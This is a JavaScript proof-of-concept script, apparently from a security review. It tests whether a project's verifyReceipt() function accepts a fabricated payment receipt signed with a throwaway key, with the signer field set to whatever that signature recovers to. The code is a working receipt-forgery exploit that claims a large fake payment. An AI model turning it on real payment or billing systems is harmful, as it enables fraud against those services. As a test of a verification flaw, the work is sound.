// Proof-of-concept: does verifyReceipt() check WHO signed, or only THAT the
// signature is self-consistent with the signer field the receipt itself carries?
// Uses 89rat's own exported primitives, no external crypto library.
import { keccak256, recoverAddress, verifyReceipt, secpPointMul, SECP_G, SECP_N, SECP_P } from "/root/pr-89rat/src/reference-verifier.mjs";
import { randomBytes } from "node:crypto";

const mod = (a, m) => ((a % m) + m) % m;
function inv(a, m) {
  let [lr, r] = [mod(a, m), m], [ls, s] = [1n, 0n];
  while (r) { const q = lr / r; [lr, r] = [r, lr - q * r]; [ls, s] = [s, ls - q * s]; }
  return mod(ls, m);
}
const toHex = (buf) => Buffer.from(buf).toString("hex");

function addressFromPrivkey(d) {
  const [x, y] = secpPointMul(d, SECP_G);
  const pub = Buffer.concat([Buffer.from(x.toString(16).padStart(64, "0"), "hex"), Buffer.from(y.toString(16).padStart(64, "0"), "hex")]);
  const h = keccak256(pub);
  return "0x" + toHex(h).slice(-40);
}

function signDigest(digestHex, privD) {
  const z = BigInt("0x" + digestHex.replace(/^0x/, ""));
  for (let attempt = 0; attempt < 50; attempt++) {
    const k = BigInt("0x" + toHex(randomBytes(32))) % SECP_N;
    if (k === 0n) continue;
    const [rx] = secpPointMul(k, SECP_G);
    const r = mod(rx, SECP_N);
    if (r === 0n) continue;
    let s = mod(inv(k, SECP_N) * mod(z + r * privD, SECP_N), SECP_N);
    if (s === 0n) continue;
    for (let recid = 0; recid < 2; recid++) {
      const sigHex = r.toString(16).padStart(64, "0") + s.toString(16).padStart(64, "0") + (recid + 27).toString(16).padStart(2, "0");
      try {
        const recovered = recoverAddress(digestHex, "0x" + sigHex);
        return { sigHex: "0x" + sigHex, recovered };
      } catch { /* try next recid */ }
    }
  }
  throw new Error("could not produce a recoverable signature in 50 attempts");
}

// Step 1: generate OUR OWN keypair, not the real facilitator's. (addressFromPrivkey
// is unused/left for reference only; we derive the signer field from the signature
// itself below via their own recoverAddress, to avoid any bug in our own derivation
// being mistaken for a finding about THEIR code.)
const myPriv = BigInt("0x" + toHex(randomBytes(32))) % SECP_N;
void addressFromPrivkey;

// Step 2: build a completely fabricated receipt claiming a large payment.
const receipt = {
  v: "XDR-1",
  tool: "totally-fake-tool",
  tool_version: "1.0.0",
  input_hash: "0x" + "11".repeat(32),
  output_hash: "0x" + "22".repeat(32),
  payer: "0x" + "33".repeat(20),
  recipient: "0x" + "44".repeat(20),
  amount: "999999999999",
  nonce: "0x" + "55".repeat(32),
  ts: Math.floor(Date.now() / 1000),
  tier: "enterprise",
};
const base = [receipt.v, receipt.tool, receipt.tool_version, receipt.input_hash, receipt.output_hash, receipt.payer, receipt.recipient, receipt.amount, receipt.nonce, receipt.ts, receipt.tier].join("|");
const digestHex = "0x" + toHex(keccak256(Buffer.from(base, "utf8")));

const { sigHex, recovered } = signDigest(digestHex, myPriv);
receipt.signature = sigHex;
receipt.signer = recovered; // the attacker just reports whatever their own signature recovers to

console.log("Self-signed signature recovers to:", recovered, "(our own throwaway key, not a real facilitator)");
const result = verifyReceipt(receipt);
console.log("verifyReceipt() result:", result);
console.log(result.ok ? "\n>>> FORGED RECEIPT VERIFIED AS VALID. <<<" : "\n>>> Forgery rejected. <<<");
